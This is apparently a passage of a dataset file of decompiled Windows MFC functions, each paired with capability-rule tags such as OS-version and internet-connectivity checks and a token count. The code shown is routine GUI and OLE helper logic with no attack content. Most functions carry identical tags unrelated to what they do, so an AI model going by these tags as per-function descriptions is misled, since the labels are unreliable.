        "decompiled_code": "\nvoid fcn.140007598(code **arg1)\n\n{\n    ulong uVar1;\n    \n    *arg1 = vtable.CDC.0;\n    if (arg1[1] != NULL) {\n        uVar1 = fcn.140007548(arg1);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "140003cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140003cd0(int64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong arg2_00;\n    int64_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    ulong hgdiobj;\n    int32_t iVar8;\n    double extraout_XMM0_Qa;\n    double extraout_XMM0_Qa_00;\n    ulong uStackX16;\n    uchar auStack232 [8];\n    int32_t iStack224;\n    int32_t iStack220;\n    int64_t iStack216;\n    uchar auStack208 [8];\n    ulong uStack200;\n    int32_t iStack172;\n    int32_t iStack168;\n    ulong uStack144;\n    uchar auStack136 [8];\n    ulong uStack128;\n    \n    uStack144 = 0xfffffffffffffffe;\n    if (*(arg2 + 0x18) == 0) {\n        hgdiobj = 0;\n        uStackX16 = 0;\n        uVar1 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(*(arg2 + 0x10), 0x26);\n        if (((uVar1 >> 8 & 1) != 0) && (*(arg3 + 8) != 0)) {\n            uStackX16 = fcn.14000797c(arg2, arg3, 0);\n            (*_sym.imp.GDI32.dll_RealizePalette)(*(arg2 + 8));\n        }\n        (*_sym.imp.USER32.dll_GetClientRect)(*(arg1 + 0x40), auStack232);\n        (*_sym.imp.GDI32.dll_DPtoLP)(*(arg2 + 0x10), auStack232, 2);\n        fcn.140003910(auStack136, arg2, auStack232);\n        fcn.140006f44(auStack208);\n        arg2_00 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(*(arg2 + 8));\n        iVar2 = fcn.1400074fc(auStack208, arg2_00);\n        if (iVar2 == 0) {\n            fcn.140007598(auStack208);\n            fcn.140003bf0(auStack136);\n        }\n        else {\n            (*_sym.imp.GDI32.dll_GetObjectA)(*(arg4 + 8), 0x20);\n            iVar3 = fcn.1400078a4(uStack200, *(arg4 + 8));\n            iVar2 = iStack172;\n            iStack216 = iVar3;\n            fcn.14001b6a8();\n            iVar7 = extraout_XMM0_Qa * iVar2;\n            iVar8 = iStack224;\n            iVar5 = iStack220;\n            iVar6 = iStack168;\n            if (iVar7 <= iStack224) {\n                do {\n                    fcn.14001b6a8();\n                    iVar4 = extraout_XMM0_Qa_00 * iVar6;\n                    if (iVar4 <= iVar5) {\n                        do {\n                            (*_sym.imp.GDI32.dll_BitBlt)\n                                      (uStack128, iVar7, iVar4, iVar2, iVar6, uStack200, 0, 0, 0xcc0020);\n                            iVar4 = iVar4 + iStack168;\n                            iVar2 = iStack172;\n                            iVar8 = iStack224;\n                            iVar5 = iStack220;\n                            iVar6 = iStack168;\n                        } while (iVar4 <= iStack220);\n                    }\n                    iVar7 = iVar7 + iVar2;\n                    iVar3 = iStack216;\n                } while (iVar7 <= iVar8);\n            }\n            if (iVar3 != 0) {\n                hgdiobj = *(iVar3 + 8);\n            }\n            fcn.1400078a4(uStack200, hgdiobj);\n            fcn.14000797c(arg2, uStackX16, 0);\n            (*_sym.imp.GDI32.dll_RealizePalette)(*(arg2 + 8));\n            fcn.140007598(auStack208);\n            fcn.140003bf0(auStack136);\n        }\n    }\n    return;\n}\n",
        "token_count": 952
    },
    "140005ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140005ce8(int64_t *arg1)\n\n{\n    if (0 < *(arg1 + 1)) {\n        (**(*arg1 + 8))(arg1, 1);\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "140005f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140005f60(void)\n\n{\n    code *pcVar1;\n    \n    if (*0x14004fe40 == 0) {\n        *0x14004fe40 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"KERNEL32\");\n        if (*0x14004fe40 == 0) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        *0x14004fe18 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x14004fe40, \"CreateActCtxW\");\n        *0x14004fe20 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x14004fe40, \"ReleaseActCtx\");\n        *0x14004fe28 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x14004fe40, \"ActivateActCtx\");\n        *0x14004fe30 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x14004fe40, \"DeactivateActCtx\");\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "14000626": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140006264(code **arg1)\n\n{\n    ulong *puVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    ulong arg1_00;\n    \n    *arg1 = vtable.AFX_MODULE_THREAD_STATE.0;\n    if (arg1[0xf] != NULL) {\n        (**(*arg1[0xf] + 0x288))();\n    }\n    fcn.1400058b4(arg1[0x12]);\n    puVar1 = arg1[5];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    puVar1 = arg1[6];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    puVar1 = arg1[7];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    puVar1 = arg1[8];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    puVar1 = arg1[9];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    if (arg1[0xe] != NULL) {\n        iVar3 = *(arg1[0xe] + 0x18);\n        while (iVar3 != 0) {\n            arg1_00 = fcn.140015c98(arg1[0xe]);\n            fcn.1400058b4(arg1_00);\n            iVar3 = *(arg1[0xe] + 0x18);\n        }\n    }\n    piVar2 = arg1[0xc];\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))(piVar2, 1);\n    }\n    piVar2 = arg1[0xd];\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))(piVar2, 1);\n    }\n    piVar2 = arg1[0xe];\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))(piVar2, 1);\n    }\n    return;\n}\n",
        "token_count": 505
    },
    "14001621": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.140016210(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    int64_t *piVar3;\n    \n    if (arg2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.140015944(arg1 + 0x30, arg2);\n        if (iVar1 == 0) {\n            iVar1 = fcn.140015944(arg1 + 0x68, arg2);\n            if (iVar1 == 0) {\n                arg1_00 = fcn.140005860(0x140016664);\n                iVar1 = fcn.140018d74(arg1 + 8);\n                iVar2 = iVar1;\n                if (iVar1 == 0) {\n                    iVar2 = fcn.140005de8();\n                }\n                (**(arg1 + 0x20))(iVar2);\n                piVar3 = fcn.140015b8c(arg1 + 0x68, arg2);\n                *piVar3 = iVar1;\n                fcn.140005860(arg1_00);\n                iVar2 = *(arg1 + 0xa8);\n                *(iVar1 + iVar2) = arg2;\n                if (*(arg1 + 0xb0) == 2) {\n                    *(iVar1 + 8 + iVar2) = arg2;\n                }\n            }\n            else {\n                iVar2 = *(arg1 + 0xa8);\n                *(iVar1 + iVar2) = arg2;\n                if (*(arg1 + 0xb0) == 2) {\n                    *(iVar1 + 8 + iVar2) = arg2;\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 397
    },
    "14000785": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140007850(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 8) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.14000780c(arg1);\n        uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 93
    },
    "140007a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140007a30(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 0x98) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (**(**(arg1 + 0x98) + 0x130))();\n    }\n    return uVar1;\n}\n",
        "token_count": 84
    },
    "140007a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140007a58(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 0x98) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (**(**(arg1 + 0x98) + 0xa8))();\n    }\n    return uVar1;\n}\n",
        "token_count": 84
    },
    "140007a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007a80(int64_t hDlg, ulong nIDDlgItem)\n\n{\n    ulong arg1;\n    \n    if (*(hDlg + 0x98) == 0) {\n        arg1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(hDlg + 0x40));\n        fcn.14000b398(arg1);\n    }\n    else {\n        (**(**(hDlg + 0x98) + 0xe8))();\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "140007ab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007ab8(int64_t hDlg, ulong nIDDlgItem, ulong *arg3)\n\n{\n    ulong uVar1;\n    \n    if (*(hDlg + 0x98) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(hDlg + 0x40));\n        *arg3 = uVar1;\n    }\n    else {\n        (**(**(hDlg + 0x98) + 0xe0))();\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "140007b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007b34(int64_t hWnd)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(hWnd + 0x40), 0xfffffff0);\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0xf0))();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "140007b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007b68(int64_t hWnd)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(hWnd + 0x40), 0xffffffec);\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0xf8))();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "140007b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007b9c(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    ulong in_R9;\n    \n    if (*(arg1 + 0xa0) == 0) {\n        fcn.140008c1c(*(arg1 + 0x40), arg2, arg3, in_R9);\n    }\n    else {\n        (**(**(arg1 + 0xa0) + 0x108))();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "140007bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007bcc(int64_t hWnd, ulong X, ulong Y, ulong nWidth)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_MoveWindow)(*(hWnd + 0x40));\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x130))();\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "140007c1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007c14(int64_t hWnd, ulong nCmdShow)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(*(hWnd + 0x40));\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x140))();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "140007c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007c44(int64_t hWnd)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_IsWindowEnabled)(*(hWnd + 0x40));\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x148))();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "140007c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007c74(int64_t hWnd, ulong bEnable)\n\n{\n    if (*(hWnd + 0xa0) == 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(hWnd + 0x40));\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x150))();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "140007ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007ca4(int64_t hWnd)\n\n{\n    ulong arg1;\n    \n    if (*(hWnd + 0xa0) == 0) {\n        arg1 = (*_sym.imp.USER32.dll_SetFocus)(*(hWnd + 0x40));\n        fcn.14000b398(arg1);\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x160))();\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "140007cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007cdc(int64_t arg1, int64_t arg2)\n\n{\n    if ((*(arg1 + 0xa0) == 0) && (*(arg2 + 0x98) != 0)) {\n        (**(**(arg2 + 0x98) + 0x138))(*(arg2 + 0x98), arg1);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "140007d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007d88(int64_t hWnd, int64_t arg2)\n\n{\n    ulong arg2_00;\n    int64_t iVar1;\n    \n    if ((hWnd != 0) && (*(hWnd + 0xa0) == 0)) {\n        arg2_00 = (*_sym.imp.USER32.dll_GetParent)(*(hWnd + 0x40));\n        iVar1 = fcn.140015944(arg2 + 0x30, arg2_00);\n        if ((iVar1 != 0) && (*(iVar1 + 0x98) != 0)) {\n            (**(**(iVar1 + 0x98) + 0x138))(*(iVar1 + 0x98), hWnd, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "140007df": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140007df0(void)\n\n{\n    uchar auStack216 [32];\n    uint uStack184;\n    uchar auStack180 [156];\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack216;\n    fcn.14001bd50(auStack180, 0, 0x90);\n    uStack184 = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&uStack184);\n    fcn.14001b410(uStack24 ^ auStack216);\n    return;\n}\n",
        "token_count": 132
    },
    "140007fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140007fb4(int32_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.140007e50();\n    if (iVar1 == 0) {\n        if (((arg2 & 3) == 0) &&\n           ((((arg1[2] < 1 || (arg1[3] < 1)) || (iVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0),  iVar1 <= *arg1))\n            || (iVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(1),  iVar1 <= arg1[1])))) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0x12340042;\n        }\n        return uVar2;\n    }\n    uVar2 = (**0x140052fc0)(arg1, arg2);\n    return uVar2;\n}\n",
        "token_count": 209
    },
    "14000815": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.140008150(int64_t *arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    ushort *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint32_t *puVar11;\n    uint *puVar12;\n    uint auStackX8 [2];\n    uint16_t in_stack_00000028;\n    int64_t *in_stack_00000030;\n    ushort *in_stack_00000038;\n    uint *in_stack_00000048;\n    int64_t iStack200;\n    int64_t iStack192;\n    int64_t iStack184;\n    int64_t *apiStack168 [4];\n    int64_t *piStack136;\n    int64_t aiStack128 [3];\n    int64_t iStack104;\n    int64_t iStack96;\n    int64_t iStack88;\n    ulong uStack80;\n    ushort auStack72 [16];\n    uint64_t uVar10;\n    \n    uVar10 = 0;\n    auStack72[0] = 0;\n    if (arg1 == NULL) {\n        return -0x7ff8ffa9;\n    }\n    if (in_stack_00000030 == NULL) {\n        return -0x7ffdfff8;\n    }\n    uVar1 = *(in_stack_00000030 + 2);\n    if (5 < uVar1) {\n        return -0x7ffdfff2;\n    }\n    if (*(in_stack_00000030 + 0x14) != 0) {\n        puVar11 = in_stack_00000030[1];\n        uVar9 = uVar10;\n        do {\n            if (uVar1 <= *puVar11) {\n                return -0x7ffdfff2;\n            }\n            uVar7 = uVar9 + 1;\n            uVar10 = uVar7;\n            uVar8 = *puVar11;\n            puVar11 = puVar11 + 1;\n            apiStack168[uVar8] = *in_stack_00000030 + uVar9 * 0x18;\n            uVar9 = uVar10;\n        } while (uVar7 < *(in_stack_00000030 + 0x14));\n    }\n    if (uVar10 < uVar1) {\n        piVar5 = *in_stack_00000030 + uVar10 * 0x18;\n        do {\n            iVar3 = uVar10;\n            uVar8 = iVar3 + 1;\n            uVar10 = uVar8;\n            apiStack168[(uVar1 - iVar3) - 1] = piVar5;\n            piVar5 = piVar5 + 3;\n        } while (uVar8 < uVar1);\n    }\n    iVar3 = -0x7ffdfffd;\n    puVar12 = auStackX8;\n    if (in_stack_00000048 != NULL) {\n        puVar12 = in_stack_00000048;\n    }\n    puVar6 = auStack72;\n    if (in_stack_00000038 != NULL) {\n        puVar6 = in_stack_00000038;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantClear)();\n    if (0x12 < arg2 + 0x139aU) goto code_r0x0001400089f0;\n    // switch table (19 cases) at 0x140008a20\n    switch(*((arg2 + 0x139aU) * 4 + 0x140008a20) + 0x140000000) {\n    case 0x14000828d:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 200))(arg1, &iStack200);\n            goto code_r0x0001400089f0;\n        }\n        break;\n    case 0x1400082ce:\n        if (*(in_stack_00000030 + 2) == 2) {\n            if (*apiStack168[0] != 3) {\n                iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[0], 0, 3);\n                if (iVar3 < 0) goto code_r0x0001400085d7;\n                apiStack168[0] = aiStack128;\n            }\n            uVar2 = *(apiStack168[0] + 1);\n            if (*apiStack168[1] != 3) {\n                iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[1], 0, 3);\n                if (iVar3 < 0) {\ncode_r0x00014000891c:\n                    *puVar12 = 1;\n                    goto code_r0x0001400089f0;\n                }\n                apiStack168[1] = aiStack128;\n            }\n            iVar3 = (**(*arg1 + 0xc0))(arg1, uVar2, *(apiStack168[1] + 1), puVar6);\n            goto code_r0x0001400089f0;\n        }\n        break;\n    case 0x14000835a:\n        if (*(in_stack_00000030 + 2) == 2) {\n            if (*apiStack168[0] != 3) {\n                iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[0], 0, 3);\n                if (iVar3 < 0) goto code_r0x0001400085d7;\n                apiStack168[0] = aiStack128;\n            }\n            iStack200 = *apiStack168[1];\n            iStack192 = apiStack168[1][1];\n            iStack184 = apiStack168[1][2];\n            iVar3 = (**(*arg1 + 0xb8))(arg1, *(apiStack168[0] + 1), &iStack200, puVar6);\n            goto code_r0x0001400089f0;\n        }\n        break;\n    case 0x1400083d3:\n        iVar4 = iStack104;\n        if (*(in_stack_00000030 + 2) == 5) {\n            while (((*apiStack168[0] & 0x4000) != 0 && ((*apiStack168[0] & 0xf) != 0))) {\n                if ((*apiStack168[0] & 0xc) == 0) {\n                    iVar4 = apiStack168[0][1];\n                }\n                else {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(apiStack168[0][1]);\n                    *apiStack168[0][1] = 3;\n                    iVar4 = apiStack168[0][1] + 8;\n                }\n            }\n            *puVar12 = 0;\n            iStack200 = *piStack136;\n            iStack192 = piStack136[1];\n            iStack184 = piStack136[2];\n            iVar3 = (**(*arg1 + 0xb0))(arg1, iVar4, iStack96, iStack88, uStack80, &iStack200);\n            goto code_r0x0001400089f0;\n        }\n        break;\n    case 0x140008488:\n        if (*(in_stack_00000030 + 2) == 2) {\n            if (*apiStack168[0] != 3) {\n                iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[0], 0, 3);\n                if (iVar3 < 0) goto code_r0x0001400085d7;\n                apiStack168[0] = aiStack128;\n            }\n            iStack200 = *apiStack168[1];\n            iStack192 = apiStack168[1][1];\n            iStack184 = apiStack168[1][2];\n            iVar3 = (**(*arg1 + 0xa8))(arg1, *(apiStack168[0] + 1), &iStack200);\n            goto code_r0x0001400089f0;\n        }\n        break;\n    case 0x1400084fe:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0xa0))(arg1, &iStack200, puVar6 + 4);\ncode_r0x0001400088a4:\n            if (-1 < iVar3) {\n                *puVar6 = 8;\n            }\n            goto code_r0x0001400089f0;\n        }\n        break;\n    case 0x140008543:\n        iVar3 = (**(*arg1 + 0x98))(arg1, puVar6);\n        goto code_r0x0001400089f0;\n    case 0x140008558:\n        iVar3 = (**(*arg1 + 0x90))(arg1, puVar6);\n        goto code_r0x0001400089f0;\n    case 0x14000856d:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x88))(arg1, &iStack200, puVar6 + 4);\n            goto code_r0x0001400088a4;\n        }\n        break;\n    case 0x1400085b2:\n        if (*(in_stack_00000030 + 2) == 2) {\n            if (((*apiStack168[0] & 0x4000) != 0) && ((*apiStack168[0] & 0xc) == 0)) {\n                iVar3 = -0x7ffdfffb;\ncode_r0x0001400085d7:\n                *puVar12 = 0;\n                goto code_r0x0001400089f0;\n            }\n            if (*apiStack168[0] == 0x400c) {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(apiStack168[0][1]);\n                *apiStack168[0][1] = 8;\n                piVar5 = apiStack168[0][1] + 8;\n            